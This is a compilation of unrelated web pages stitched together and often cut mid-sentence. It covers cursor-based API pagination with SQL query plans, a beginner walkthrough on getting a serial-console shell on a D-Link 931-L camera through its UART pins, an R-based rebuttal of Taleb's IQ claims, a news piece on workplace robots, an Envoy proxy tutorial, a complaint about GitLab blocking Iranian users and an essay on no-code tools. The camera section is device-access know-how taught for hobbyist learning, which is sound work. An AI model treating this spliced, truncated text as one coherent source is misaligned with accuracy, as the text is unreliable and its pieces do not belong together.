<p>In case of a simple offset it’ll look like <code>?offset=1000</code> and <code>?offset=1100</code> — it’s the same old soup, just reheated. It’ll either go straight into SQL query like <code>OFFSET 1000 LIMIT 100</code> or will be multiplied by page size (that <code>LIMIT</code> value). In any case, it’s a suboptimal solution, since every database has to skip that 1000 rows. And to skip them it needs to identify them. It does not matter if it’s PostgreSQL, or ElasticSearch, or MongoDB, it’ll have to order them, count them, and throw them away.</p>
<p>This is a kind of work which no one needs. But it repeats over and over again since it’s <em>easy</em> to implement — you directly map your API onto your query to a database.</p>
<p>What do you do then? We could look at what databases do! They have this concept, called <a href="https://en.wikipedia.org/wiki/Cursor_(databases)">cursor</a> — it’s a pointer to a row. So you can say to a database “return me 100 rows after <strong>that</strong> one”. And it’s much easier for a database to do since there is a good chance that you’ll identify the row by a field with an index. And suddenly you don’t need to fetch and skip those rows, you’ll go directly past them.</p>
<p>An example:</p>
<pre><code>GET /api/products
{"items": [...100 products],
 "cursor": "qWe"}
</code></pre>
<p>API returns an (opaque) string, which you can use then to retrieve the next page:</p>
<pre><code>GET /api/products?cursor=qWe
{"items": [...100 products],
 "cursor": "qWr"}
</code></pre>
<p>Implementation-wise there are many options. Generally, you have some ordering criteria, for example, product id. In this case, you’ll encode your product id with some reversible algorithm (let’s say <a href="https://hashids.org/">hashids</a>). And on receiving a request with the cursor you decode it and generate a query like <code>WHERE id &gt; :cursor LIMIT 100</code>.</p>
<p>Just a little performance comparison, look at how offsets work:</p>
<pre><code>=# explain analyze select id from product offset 10000 limit 100;
                                                           QUERY PLAN                                                            
---------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=1114.26..1125.40 rows=100 width=4) (actual time=39.431..39.561 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1274406.22 rows=11437243 width=4) (actual time=0.015..39.123 rows=10100 loops=1)
 Planning Time: 0.117 ms
 Execution Time: 39.589 ms
</code></pre>
<p>And how where works:</p>
<pre><code>=# explain analyze select id from product where id &gt; 10000 limit 100;
                                                          QUERY PLAN                                                          
------------------------------------------------------------------------------------------------------------------------------
 Limit  (cost=0.00..11.40 rows=100 width=4) (actual time=0.016..0.067 rows=100 loops=1)
   -&gt;  Seq Scan on product  (cost=0.00..1302999.32 rows=11429082 width=4) (actual time=0.015..0.052 rows=100 loops=1)
         Filter: (id &gt; 10000)
 Planning Time: 0.164 ms
 Execution Time: 0.094 ms
</code></pre>
<p>That is a difference of several orders of magnitude! Of course, the actual numbers depend on a size of a table, on your filters and on a store implementation. There <a href="https://use-the-index-luke.com/no-offset">a great article</a> with more technical information - there are slides embedded, see slide 42 for performance comparison.</p>
<p>Of course, nobody orders products by an id — you usually order them by some relevancy (and then by id as a <a href="https://stackoverflow.com/a/17330992/46854">tie breaker</a>). In the real world, you’ll have to look at your data to determine what to do. Orders can be ordered by id (as it’s monotonically increasing). Wishlist items can be ordered like that as well — by wishlisting time. In our case products come from ElasticSearch, which naturally supports this cursor stuff.</p>
<p>One deficiency you can see is that it’s impossible to generate a “previous page” link with a stateless API. So in case of a user-facing pagination, if it’s important to have prev/next and “go directly to page 10” buttons there is no way around this offset/limit stuff. But in other cases using cursor-based pagination can greatly improve performance, especially on really big tables with really deep pagination.</p>

	</p>
      <p>I’ve (finally) posted the follow up to my last video! In this one we’re dipping a toe into hardware reversing by finding a UART (serial port) and using it to get shell access on a 931-L. If you’ve never done anything with hardware this is a great place to start, or at least get some initial exposure to the concept.</p>

<p>For those who want to try this on there own I’ve posted a list of tools/equipment, a set of quick reference steps from the walkthrough, and finally some troubleshooting ideas in case you hit any snags. The camera is cheap and it’s about as soft a target as they come, so hopefully this is a fun way to cut your teeth.</p>

<h3 id="tools-and-equipment">Tools and Equipment</h3>

<p>Here’s a breakdown of what we used in the video, roughly in the order it appeared. You don’t need specific makes/models of anything except the 931-L; whatever equivalent tools you have will probably do the trick.</p>

<ul>
  <li>D-Link 931-L Camera</li>
  <li>Shim made from an aluminum can</li>
  <li>1mm guitar pick</li>
  <li>Phillips head driver (PH0)</li>
  <li>Benchtop Vise (Panavise 201)</li>

<strong>Finding Internal Photos in FCC Filings</strong></p>

<p>We needed to know if the 931-L had the kind of attack surface we were looking for (specifically a UART). To get a peek at the inside of the camera before buying it we looked at the internal photos included in the camera’s FCC filing. You can find the photos shown in the video by opening the <a href="https://www.fcc.gov/oet/ea/fccid">FCC’s search tool</a> and entering 931-L’s FCC ID: KA2CS931LA1.</p>

<p>Quick Tip: If you want to find the filing for a device but don’t know the FCC ID, try <a href="https://fccid.io/search.php">FCCID.io’s free search tool</a>. It’s a lot faster/easier than trying to pry it out of the FCC’s search tool.</p>

<p><br>
<strong>Cracking the Case and Prepping the Board</strong></p>

<p>The camera’s case is held together with ~8 plastic clips, which we removed using a shim cut from an aluminum can and a 1mm guitar pick (there are great kits available for this kind of thing but I wouldn’t recommend investing in one for your first project).</p>

<p>We put the board into a benchtop vise to hold it steady, then plugged the power supply into a switched outlet. This allowed us to power the device up and down easily, without fumbling around to pull the cable out. If you don’t have a switched outlet, a surge protector or a lamp cord switch will do the trick just fine.</p>

<p>A bit out of order here, but one last board prep item: we also placed a row of 4 header pins into the row of plated through holes (TPHs). We didn’t solder it, but we got really lucky there. If you’re doing this on your own I’d recommend soldering them in, if only to remove a possible point of failure. It’s also worth noting that the pin size and pin pitch (distance between pins) is smaller than the more commonly sized connectors out there. If you run into problems, consider just soldering jumper wires to the PTHs themselves (to save time remember you don’t actually need the one marked V!)</p>

<p><strong>Finding the UART</strong></p>

<p>The JST connectors shown in the FCC photos weren’t on our camera, but the four plated through holes (PTHs) that the JST connector used where still present. As shown below the reference designator on the board was J2, and PTHs themselves were labeled “G”, “R”, “T”, and “V”.</p>

<p><img src="http://1585security.com/img/blog/2019/UART-on-board.jpg" alt=""></p>

<p><strong>Testing the UART</strong></p>

<p>It seemed likely that the labels on those PTHs stood for Ground, Receive, Transmit, and some kind of voltage, but we ran a hasty survey to be sure. We began by checking for Ground on “G” by using the multimeter to run a continuity test between “G” and a spot on the board where the ground plane was exposed.  With ground confirmed we switched the multimeter to measure DC voltage, powered on the device and checked the voltage levels on “R”, “T”, and “V”. Observations and conclusions from the survey are summarized below.</p>

<em>Quick Tip:</em> If you’ve never used a multimeter or are just a bit rusty, there are loads of tutorials out there. SparkFun’s <a href="https://learn.sparkfun.com/tutorials/how-to-use-a-multimeter/">How to Use a Multimeter</a> is solid and includes walkthroughs of the continuity and voltage measurements we did in the video.

<strong>Wiring up the FTDI</strong></p></div>

<p>With the camera powered off, we connected the FTDI to the camera board using jumper wires and grabber probes as shown below. Note that the “V” was not connected.</p>

<p><img src="http://1585security.com/img/blog/2019/ftdi-wired.jpg" alt=""></p>

<div><p>Once the FTDI was wired up, we connected it to the laptop via USB.
</p><p>
<strong>Verifying the USB and opening a serial connection</strong></p></div>

<p>With the camera powered off, we verified that the Kali VM recognized the FTDI with <code>lsusb</code>. We then found the TTY for it by running <code>ls /dev/|grep USB</code>. Since the FTDI was the only USB device attached to the VM, it was the only game in town (USB0).</p>

<p><img src="http://1585security.com/img/blog/2019/verifying-USB.jpg" alt=""></p>

<p>We now knew where to open the serial connection using the <code>screen</code> utility, but we didn’t know which baud rate to specify. While we could have calculated it or used a tool that could calculate it for us, we opted to try guessing it from a short list of common baud rates.</p>

<p>Our first guess was 115200. We tested it by opening a serial connection with <code>screen /dev/ttyUSB0 115200</code>, and then powering up the camera. The result was mangled output, so this was a bad guess. We powered off the camera, then exited <code>screen</code> with a <em>ctrl+A+D</em></p>

<p><img src="http://1585security.com/img/blog/2019/mangled-serial.jpg" alt=""></p>

<p>Next we tried another common baud rate: 57600. Again, we used screen to open a serial connection (<code>screen /dev/ttyUSB0 57600</code>), then powered on the camera. This time it worked! We could see the bootloader, which appeared to be unlocked.</p>

<p><img src="http://1585security.com/img/blog/2019/boot-loader-menu.jpg" alt=""></p>

<p>The boot process took ~3 minutes, during which a lot of information was written to the screen. We kept a copy of everything for an offline review (we used the scrollback buffer, but screen does have a native logging feature). After the console messages from the boot process calmed down we verified the shell with a few basic commands (<code>pwd</code>, <code>ls</code>, and <code>ps -ef</code>).</p>

<p>That was it for this one. Next time we’ll poke around the shell a bit and see what we can do.
<br></p>
<h3 id="troubleshooting">Troubleshooting</h3>

<p>A few common problems and things to try if you run into them:</p>

<p><strong>Your machine doesn’t recognize the FTDI</strong>. You’ve made sure the FTDI is connected via the USB cable, but you don’t see it in a <code>lsusb</code>.</p>

<ul>
  <li>If you’re running a VM, make sure the USB is connected to that, rather than your host machine.</li>
  <li>Depending on your OS and FTDI it could be a driver issue, check the docs for your stuff.</li>
  <li>If all else fails, disconnect it all, reboot, and reconnect it.</li>
</ul>

<p><strong>Errors when opening a serial connection</strong>. You’re getting error messages with stuff like <em>Device Busy</em> or <em>Cannot exec ‘/dev/ttyUSB0’: No such file or directory</em>.</p>

<ul>
  <li>Screen is notorious for hanging onto devices if it’s not detached gracefully, which can cause <em>device busy</em> errors. Check for fouled processes with something like <code>ps -ef|grep SCREEN</code>. Prevent this kind of stuff by making sure you detach from <code>screen</code> connections with <em>ctrl+A+D</em></li>
  <li>If you’re getting <em>no such file or directory</em> errors, it could be that your machine isn’t recogizing the FTDI (see above), or just that you’re specifying the wrong device. Double check that TTY- it won’t always be ttyUSB0, particularly if you’ve got more than one USB device connected.</li>
</ul>

<p><strong>A serial connection opens but nothing happens</strong>. Sounds like your computer can talk to the FTDI (that’s good), but not beyond it.</p>
<ul>
  <li>Check your wires, make sure the connections are good, and that everything is going to the right place.</li>
  <li>See the wiring diagram above for reference…mistakes like putting R-to-R are easy to make.</li>
</ul>

<p><strong>A serial connection opens but the output is a mess</strong>.  We saw this in the video when the baud rate was wrong, so that’s an easy thing to check. But assuming that’s right:</p>
<ul>
  <li>Triple-check (srsly) your ground connection- especially if “everything was working fine last time”. A bad ground can foul up all sorts of stuff, and is often the source of connections looking janky/missing information.</li>
</ul>

<p><strong>Camera isn’t booting or is otherwise being weird</strong></p>
<ul>
  <li>Check your connections to ensure you’re not accidentally shorting anything. A bit too much solder or a bad angle on a grabber probe is usually the culprit.</li>
  <li>If you’re still having trouble after that try the factory reset process (see camera docs).</li>
  <li>It’s also possible that your board became damaged at some point, but fixing stuff like that is beyond what a beginner should try to fix.</li>
</ul>

<h3 id="introduction">Introduction</h3>
<p>In this post I look into the document by Nassim Taleb: <a href="https://medium.com/incerto/iq-is-largely-a-pseudoscientific-swindle-f131c101ba39">IQ is largely a pseudoscientific swindle</a>. Most of the document is just a rant, but he does make some quantitative claims, which is good. I investigate the veracity of these claims using real data.</p>
<p>[Edit: The quotes below were taken verbatim from Taleb’s document as it was written when this post was uploaded.]</p>

<h3 id="variance-explained-by-iq">Variance explained by IQ</h3>
<p>Claim:</p>
<blockquote>
<p>[IQ] explains at best between 2 and 13% of the performance in some tasks</p>
</blockquote>
<p>I already have prepared the <a href="https://www.ssc.wisc.edu/wlsresearch">WLS</a> data set <a href="http://jsmp.dk/files/wls_data.html">here</a>, and it has a good IQ test, so I will use that. Lets look at the regression of grades on IQ.</p>

</div>
<p>The adjusted R<sup>2</sup> is 0.356, so IQ explains ~35% of the variance of grades in this data set. Taleb defenders may say that things such as school grades don’t matter in real life. But whatever your position on this, the situation is that he made a specific claim about how much IQ explains <em>at best</em>, which was off by a large factor.</p>

<h3 id="iq-selection-vs-random-selection">IQ selection vs random selection</h3>
<p>Claim:</p>
<blockquote>
<p>Turns out IQ beats random selection in the best of applications by less than 6%</p>
</blockquote>
<p>He hasn’t specified what exactly he means by this. But I’m pretty sure he is thinking of a comparison like the one he talks about in this tweet:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/puzzle.jpg" width="300px"></p>

<p>So I will analyze something this, a stylized example with assumptions similar to these. In the real world, you will likely have other information that complicates this picture, such as education credentials; but we ignore that for now.</p>
<p>I create two normally distributed variables, with correlation 0.5, and call them IQ and performance.</p>
<div data-layout="l-body">

                 2,2))

df &lt;- tibble(IQ = X0[,1], 
             performance = X0[,2])

df %&gt;% summarise(
  cor = cor(IQ, performance), 
  n = n(),

</div>

<p>The probability of hiring an employee with above average performance, if you hire an employee with above average IQ is:</p>
<div data-layout="l-body">
<pre><code>
above_average_iq &lt;- df %&gt;% filter(IQ &gt; 0)

nrow(above_average_iq %&gt;% filter(performance &gt; 0)) / nrow(above_average_iq)
</code></pre>
<p><em>0.667</em></p>
</div>

<p>The probability if there was 0 correlation is of course 0.5. So using IQ as a criteria beats random selection by 16.67% (as Taleb also found). This is a little more than 6%, but that is a detail. More importantly, this example is a theoretical use case where using IQ testing is not so useful. To look at something a little more realistic, let’s say a company wants to avoid people with a performance more than 2 standard deviations below the mean. (Perhaps such employees have a risk of causing large harm, which could for instance be an issue in <a href="https://quillette.com/2018/08/25/the-dangers-of-ignoring-cognitive-inequality/">the military</a>.) And we again compare admitting people at random vs only taking applicants with above average IQ.</p>
<p>If the company admits people at random, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection &lt;- 
  nrow(filter(df, performance &lt; -2)) / n

bad_performance_w_random_selection
</code></pre>
<p><em>0.0228</em></p>
</div>

<p>And if the company only takes applicants with above average IQ, we get this proportion of people with a performance more than 2 SD below the mean:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_iq_criteria &lt;- 
  nrow(filter(above_average_iq, performance &lt; -2)) / 
  nrow(above_average_iq)

bad_performance_w_iq_criteria
</code></pre>
<p><em>0.00406</em></p>
</div>

<p>This is an improvement by a factor of:</p>
<div data-layout="l-body">
<pre><code>
bad_performance_w_random_selection / bad_performance_w_iq_criteria
</code></pre>
<p><em>5.6</em></p>
</div>

<p>In other words, using IQ selection criteria in this case beats random selection by more than 450%. Quite different than the claimed 6%.</p>

<h3 id="iq-and-income">IQ and income</h3>
<p>Claim:</p>
<blockquote>
<p>There is no correlation IQ/Income above 45K</p>
</blockquote>
<p>He makes this claim based on this image:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqincome.png" width="450px"></p>
<p>The image is from <a href="https://psycnet.apa.org/record/2007-12577-007">this paper</a>, which gets its data from <a href="https://www.bls.gov/nls/nlsy79.htm">NLSY79</a>.

<p>As in the plot used by Taleb it’s quite hard to see whats going on with all the overlying points. Reducing the transparency helps somewhat.</p>

<p>Another way to make the relationship clearer is to plot the distribution of income for seperate IQ groups. Plotting the distribution avoids the issue of the plot becoming unclear and confusing due to overlapping points.</p>
<p>The plot below again plots only people with income above $45k per year. The difference IQ makes is clear, both in the median value, and the length of the tails.</p>

<h3 id="iq-and-fat-tails">IQ and fat tails</h3>
<blockquote>
<p>[The income data] truncates the big upside, so we not even seeing the effect of fat tails</p>
</blockquote>
<p>It is correct that in the presence of fat tails the correlation is uninformational in predicting expected income. And the data from these studies does not give good information about such tails. However, it is highly possible that the effect of IQ is even more impactful in the tails, rather than less. For example, Bill Gates and Paul Allen scores 1590/1600 on their SATs, which for SATs at that time meant extremely high IQs. Since Bill Gates is also in the tail of wealth and income, this indicates that the overall impact of people in the tails is to accentuate rather than diminish the importance of IQ.</p>

<h3 id="correlation-only-for-low-iq">Correlation only for low IQ</h3>
<blockquote>
<p>IQ mostly measures extreme unintelligence</p>
</blockquote>
<p>He claims that IQ has high correlation with traits at low IQ, but that this correlation falls drastically at above median IQ, as illustrated in this figure from the post:</p>
<p><img src="https://www.jsmp.dk/posts/2019-06-16-talebiq/images/iqcor2.png" width="300px"></p>
<p>(Edit: In case this is not clear, Taleb uses the above figure as an illustration, not as a precise empirical claim.) It’s quite easy to look into the data to see whether this actually is the case. We can use the same two data sets used above.</p>
<p>If we plot IQ vs log(income), that will tell us how large a percentage increase in income each extra IQ point gives. Then we can plot a local regression (loess) and compare that to a linear regression. If the relationship between IQ and income radically diminished at above average IQ, then we would expect the loess regression line to approach horizontal. However, this is not what we see - instead the two regression lines follow each other quite closely. It is true that the percentage increase in income per IQ point is a little higher for lower IQs, but it never stagnates.</p>

Additionally, many businesses have moved much of their sales and customer services online, increasing their reliance on digital technologies," they explained.</p>  <p><a href="https://time.com/5876604/machines-jobs-coronavirus/" target="_blank">In the U.S., Time's Alana Semeuls explained</a> that in the late 1800s and 1900s, companies retrained employees for new jobs to replace old jobs transformed by increasing automation and industrialization. And governments invested in education, as a workforce largely made up of farmers diversified into bankers, engineers and more.</p>  <p>But today, tax incentives in the U.S. mean companies might pay less tax purchasing equipment than spending the same amount of money hiring workers.</p>  <p>However, Frank Pasquale, a law professor at Brooklyn Law School, argues that human jobs don't have to be traded in for the inevitable advances in technology and artificial intelligence.</p>  <p>In his book <em>New Laws of Robotics: Defending Human Expertise in the Age of AI</em>, he draws a line between AI, or artificial intelligence, and what he calls I.A., or intelligence augmentation.</p>  <p>He gave an example of an AI robot doctor scanning a patient and handing out a diagnosis, compared to a human doctor using an advanced scanner to compare a person's vital signs to millions of archived images of cancerous and non-cancerous cells to help aid the diagnosis.</p>  <p>"The idea is that ultimately you'd have the doctor as an intermediary between the technology and [the] person who's being treated," he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 300w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 460w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 620w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 780w,https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5705826.1598829043!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/lytbot-at-wildlife-haven-rehabilitation-centre.jpeg"></p></div><figcaption>A Lytbot disinfection robot and electrostatic portable sprayer robot was recently donated to the Wildlife Haven Rehabilitation Centre in Manitoba.<!-- --> <!-- -->(Submitted by Wildlife Haven Rehabilitation Centre)</figcaption></figure></span></p>  <p>As of now, a robot programmed with preferred responses to a patient or customer's questions is no substitute for genuine person-to-person communication — and Pasquale argues it's foolish to pretend otherwise.</p>  <p>"The robot may simulate emotion and empathy, but because it is itself not mortal … it is sort of a counterfeiting of the human ability to understand, reflect, [and] empathize," he said.</p>  <p>He developed four "new laws of robotics"&nbsp;to navigate its growing role in society, a play on sci-fi author Isaac Asimov's laws of robotics introduced in the 1942 short story <em>Runaround</em>.</p>  <p>Pasquale's new laws are:</p>  <ul>   <li> <p>Employ robotics and A.I. in ways that complement professionals, instead of replacing them.</p> </li>   <li> <p>Prevent robots from mimicking human qualities like empathy or emotion</p> </li>   <li> <p>Avoid "arms races" between robotics researchers.</p> </li>   <li> <p>Keep record of who designed or controls a robot, in order to know who to contact — or hold responsible — in case something goes wrong.</p> </li>  </ul>  <h2><strong>Robotic tools, or companions?</strong></h2>  <p>As the pandemic thrusts robots and automation further into the mainstream spotlight, some people may find them unusual, or even unnerving.</p>  <p>Carpenter explained that many people's expectations of robots are based in science fiction. And in the West, at least, those depictions are often threatening. For every R2-D2 in Star Wars, she says, you'll find a seething Terminator — or the murderous robot dog in Black Mirror.</p>  <p>"It's a combination of fascination at the technology, but also a little bit of fear [and] trepidation because they don't understand its capabilities and its limitations," said Carpenter.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/julie-carpenter-book.jpg 300w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/julie-carpenter-book.jpg 460w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/julie-carpenter-book.jpg 620w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/julie-carpenter-book.jpg 780w,https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/julie-carpenter-book.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5774965.1603481737!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/julie-carpenter-book.jpg"></p></div><figcaption>Julie Carpenter says her research of Explosive Ordnance Disposal (EOD) personnel and their interactions with robots has implications for many fields.<!-- --> <!-- -->(Submitted by Julie Carpenter/Routledge/CBC composite)</figcaption></figure></span></p>  <p>If you're introducing robots into the workplace, she said, talk to your colleagues about what they're being used for, and how they might affect everyone's work.</p>  <p>"Have discussions with your staff. Say, this is what we're thinking about. These are the robots we're looking at. This is how your job might change,"&nbsp;she said.</p>  <p>Sometimes, Carpenter added, people might be more willing to embrace robots in the workplace if they take on a familiar form — like how the four-legged Spot resembles a dog.</p>  <p>But she noted that people can develop an attachment to robots simply because of the roles they play, even without anthropomorphizing them.</p>  <p>Carpenter studied how the U.S. military uses robots for tasks like bomb disposal for her book <em>Culture and Human-Robot Interaction in Militarized Spaces.</em></p>  <p>She found that many U.S. military forces use robots for sensitive or dangerous tasks, such as explosive disposal. Even though they looked more like miniature tanks, some soldiers would give them names, or consider them a mascot for their unit.</p>  <p>"I want to emphasize, though, they would never regard it the same as a human teammate, at this point,"&nbsp;she said.</p>  <p>"But you can see … that we're navigating and negotiating where robots fit into our lives, even socially."</p></span></p></div></div>]]>

    <p>Overview</p>
    <div id="para-div">
      <p><span>Envoy</span> is an open source service proxy and a communication bus designed for large modern API
        driven microservices architecture. It is a Layer3/Layer4 (TCP/UDP) network proxy with additional support for Layer7 (HTTP).</p>
      <p>Before describing the architecture components of <span>Envoy</span>, we define the following two terms:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p><span>Downstream</span> :: a client entity connecting to Envoy to send requests and receives responses</p>
        </li>
        <li>
          <p><span>Upstream</span> :: a service entity that Envoy connects to for forwarding requests and for getting
            responses from</p>
        </li>
      </ul>
    </div>
    <p>The following diagram illustrates the high-level architecture of <span>Envoy</span>:</p>
    <div id="img-outer-div"> <p><img src="https://www.polarsparc.com/xhtml/images/envoy-2.png" alt="Envoy Architecture"></p><p>Figure-1</p>
    </div>
    <br>
    <div id="para-div">
      <p>The following are the core components of <span>Envoy</span>:</p>
      <ul id="blue-sqr-ul">
        <li>
          <p><span>Listener</span> :: module responsible for binding to an IP address/port and accept connections
            from <span>Downstream</span> nodes</p>
        </li>
        <li>
          <p><span>Cluster</span> :: module responsible for connecting to a group of <span>Upstream
            </span> nodes and forwarding requests using an associated load-balancing policy</p>
        </li>
        <li>
          <p><span>Load Balancer</span> :: module responsible for distributing traffic between the different
            <span>Upstream</span> nodes within a <span>Cluster</span> in order to effectively use the
            available resources</p>
        </li>
        <li>
          <p><span>Network Filter</span> :: module that handles incoming requests on a <span>Listener
            </span> and maps them to the appropriate <span>Cluster</span>(s)</p>
        </li>
        <li>
          <p><span>Filter Chain</span> :: a series of <span>Network Filter</span>(s) that form a
            request processing pipeline</p>
        </li>
        <li>
          <p><span>Worker Thread</span> :: architecture uses a single process with multiple threads. Once a
            <span>Downstream</span> connection is accepted by a <span>Listener</span>, the connection
            spends the rest of its lifetime bound to a single worker thread</p>
        </li>
        <li>
          <p><span>HTTP Router Filter</span> :: implements HTTP forwarding by reverse proxying requests from the
            <span>Downstream</span> to the appropriate <span>Cluster</span> based on route configuration</p>
        </li>
      </ul>

    <p>Installation and System Setup</p>
    
    <p>The following picture illustrates the 5-node <span>ODroid-N2</span> cluster in operation:</p>

        my-n2-5</span>. In each of the Terminal tabs, <span>ssh</span> into the corresponding node.</p>
    <p>To setup the package repository for <span>Docker</span> on the node <span>my-n2-1</span>, execute
        the following commands:</p>

        <p><span dir="auto" itemprop="articleBody"><p>On 3rd Oct. 2020 GitLab blocked Iranians’ access (based on IP) without any prior notice! and five days later (8th Oct.) my friend’s account blocked and still he doesn’t have any access to his projects! even after creating a ticket and asks for a temporary access to only export his projects! <strong>GitLab refused to unblock him!</strong> (screenshot in appendix). My friend is not the only one who blocked by GitLab, with a simple search on the web you can find a growing list of blocked accounts.  <br>
So I decided to move from GtiLab and EVERY Free Software based/hosted/managed on/in USA.</p>

<p>GitLab is not the only actor in this discrimination against Persian/Iranian people, we also blocked by GitHub, Docker, NPM, Google Developer, Android, AWS, Go, Kubernetes and etc.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2><strong>Introduction</strong></h2><p>I have been building web apps and native apps on two of the leading no-code tools out there for the last year. When I started, I was blown away. I could get so much done in so little time.</p><p>Being a developer, this was liberating. I had always felt that a lot of the things we developers do aren’t actually that complicated. Unfamiliar syntax and complex developer processes keep people out. 99% of the time, developers are just wiring things. So initially, it made sense. While other developers scoffed at these tools, I was churning out apps after apps in a few weeks time.</p><p>As months rolled by, my budding romance with no-code tools ebbed. I struggled to justify why we were building things using them. I was interested in this space so I did my research. I read the no-code manifesto from various sources, tried out a bunch of other tools and began putting my thoughts together. </p><p>This essay is the result of that research. Please note, when I say no-code in this article, I mean no-code app builders / website builders. I don’t have any experience with the other types of no-code tools (such as automations, integrations etc) so I won’t comment about them.</p><h2>Why no-code</h2><p>Let’s take a logistics example. In logistics, there are standardised solutions for the highways, railroads and seas. That transportation is relatively cheap because you can move a lot of things together and economies of scale kick in. </p><p>Getting things from the highways into individual homes, however, is difficult and expensive because you need one transportation medium for each consumer. This is also called as the last-mile problem.</p><p>Coming back to software, we now have standardised solutions for the “highway” problems. We have solutions for email, video conferencing, searching, entertainment and so on. These problems are faced by a large number of people and so it makes economic sense for businesses to go solve them.</p><p>Then, we have the small problems. For example, an app that one business in the world needs to solve an operational challenge. This use-case is so specialised that businesses just don’t have an incentive to solve it. Without no-code, this business will have to get this software custom built which will take a lot of time and money. This is where no-code shines. It provides simple building blocks that users can use to put together a custom solution. Goes without saying, no-code tools are only as good as their primitives - these fundamental building blocks that they allow mixing and matching.</p><blockquote><p>With no-code, you can build custom things for yourself that you can’t find an out-of-the-box solution for.</p></blockquote><h2>Landscape today</h2><p>A lot of the last-mile problems in software yesterday are now becoming railroad problems. In fact, we are finding more efficient solutions for many of the railroad problems as well. </p><p>Take Shopify for example. Does it make sense for anyone to build an e-commerce store from scratch today? Shopify provides so many features for such a low starting price that it’s just impossible for anyone building it from scratch to match it.</p><p>Until a few years ago, if you were a SAAS and you needed a decent software for organising your guides, API reference and solutions, your options were Intercom, Freshdesk and Zendesk. All of them are full-blown support platforms which you might or might not need. Today, you can create a public Notion document with all your support articles and you’re done. For free. Notion provides search out-of-the-box, supports all sorts of media types and looks great. There are a dozen other things you can do in Notion for which you previously would have paid to several different vendors.</p><p>Airtable has done something similar to operations on entities. If you want to create a form on top of an Airtable base, you can do that at the click of a button within Airtable. In fact, you can assemble entire apps within Airtable.</p><p>In the near future, we will see solutions that will introduce even better abstractions and upgrade last-mile solutions into railroads solutions and railroads solutions into their more efficient variants.</p><h2>What’s my problem</h2><p>My fundamental problem is that most no-code tools out there say that their users will not need code at all. No, I am not referring to the term “no-code”. Many in the no-code community agree that that name is a misnomer. I am referring to what these tools say on Twitter, or write on their landing pages. They say you can build <em>anything </em>without any code at all. That I think is either a <em>blatant lie </em>or a delusion.</p><p>With no-code tools, you are simply putting blocks together. If you need a different block or if you are looking for smaller blocks than the ones that the tool provides, you are stuck. </p><blockquote><p>The truth is - code is king. When you want custom flows, code will come to rescue. When you need a component that doesn’t exist, code will come to rescue. When you want to connect anything that the creators of the no-code tool didn’t envision getting connected, code will be the answer.</p></blockquote><p>Don’t confuse my argument with another argument that people throw at no-code tools - “You are using code underneath. You need developers for that code. What no-code?” </p><p>I think there is definitely value in creating a layer on top of code. My big problem is - today’s no-code tools don’t seem to admit that their primitives are not good enough. </p><p><strong>That they still don’t have a primitive that comes close to code.</strong></p><p>With the primitives that no-code has today, there is no competitive edge. Anyone can build a bunch of components, write some integrations and ship a new no-code tool. Please don’t say these products have communities. When a user is stuck, they are looking for answers and no amount of community support can unblock them.</p><p>Worse still, SAAS software such as Notion and Airtable can eventually provide most of the functionalities that no-code tools provide, out-of-the-box. They have access to the same primitives. It’s already happening. There are SAAS today that are providing white-label apps to restaurants, convenience stores, e-commerce stores etc. </p><p>Let’s say there is an app that people use a no-code tool today to build. If there are sufficient number of users that need this app, eventually, there will come a SAAS that will generalise what users need and offer a standard solution. Since they will dive deep into that specific problem, they will be able to put together features that no-code app builders would take a long time to build. Some might not even be possible.</p><p>I know some will go - “What is he even talking about? I have built so-and-so complicated software with x no-code tool”. Let me take a very specific example and show you what I mean. I have personally struggled with this one, so I know what I am talking about.</p><h2>An example</h2><p>Let’s say you have an app with a list of convenience stores. Whenever a user opens your app, you want to sort the list of stores in the increasing order of distance from the user’s current location. That’s it, no big deal. </p><p>You have a Google sheet with data that looks as below:</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fef5da496-a5df-467b-be5a-cd9b312e4a5d_624x89.png"><img 